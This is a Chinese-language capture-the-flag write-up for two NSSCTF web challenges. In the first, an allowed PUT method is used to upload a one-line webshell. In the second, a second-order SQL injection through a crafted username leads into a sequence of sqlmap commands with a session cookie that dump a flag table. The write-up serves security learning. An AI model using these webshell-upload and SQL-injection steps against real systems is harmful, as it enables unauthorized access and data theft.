#### Round #1

##### basic_check

题目：https://www.nssctf.cn/problem/2199

一个页面内什么都没有，先扫一下目录和可用的请求类型。使用curl的具体命令为：

```shell
curl -X OPTIONS http://example.com -i
```

这道题支持PUT请求

> PUT请求如果URI不存在，则要求服务器根据**请求创建资源**，如果存在，服务器就接受请求内容，并修改URI资源的原始版本。

所以我们可以通过PUT请求传一个一句话木马即可拿到访问权限。

##### sql_by_sql

题目：https://www.nssctf.cn/problem/2200

参考：https://www.cnblogs.com/jackie-lee/p/16124022.html

发现可以注册用户，考虑二次注入。先注册一个amin' --+的恶意用户，再修改密码，这样admin的密码就被改成了我们的输入。在主页发现注入点，需要使用布尔盲注，尝试sqlmap自动化解决。一开始没注成功，把level提高到3成功了。POC如下：

```shell
sqlmap -u "http://node4.anna.nssctf.cn:28513/query" --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" --level 3
// 这里的链接：/query data：id=1和cookie的内容用burp抓包就可以看到，即为sqlmap找到正确的注入点
sqlmap -u "http://node4.anna.nssctf.cn:28513/query" --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" --tables
// 这里是确定注入点后使用--tables参数让sqlmap读取数据库的表名
sqlmap -u http://node4.anna.nssctf.cn:28513/query --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" -T "flag" --columns
// 这里用-T指定数据表后使用--columns参数让sqlmap读取数据库的列名
sqlmap -u http://node4.anna.nssctf.cn:28513/query --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" -T "flag" -C "flag" --dump
// 这里打印flag表flag列的内容，得到flag
```

